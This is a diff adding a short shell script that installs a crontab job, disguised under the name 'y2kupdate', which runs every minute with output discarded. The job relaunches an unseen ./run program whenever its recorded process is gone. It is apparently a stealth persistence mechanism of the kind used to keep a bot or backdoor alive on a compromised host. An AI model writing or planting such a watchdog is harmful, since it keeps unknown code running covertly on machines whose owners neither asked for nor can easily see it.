@@ -1,0 +1,18 @@
+
+pwd > Generasi.dir
+dir =$(cat Generasi.dir)
+echo "* * * * * $dir/y2kupdate >/dev/null 2>&1" > cron.d
+crontab cron.d
+crontab -l | grep y2kupdate
+echo "
+if test -r $dir/pid.Generasi; then
+pid=\$(cat $dir/pid.Generasi)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+cd $dir
+./run &>/dev/null" > y2kupdate
+chmod u+x y2kupdate
+
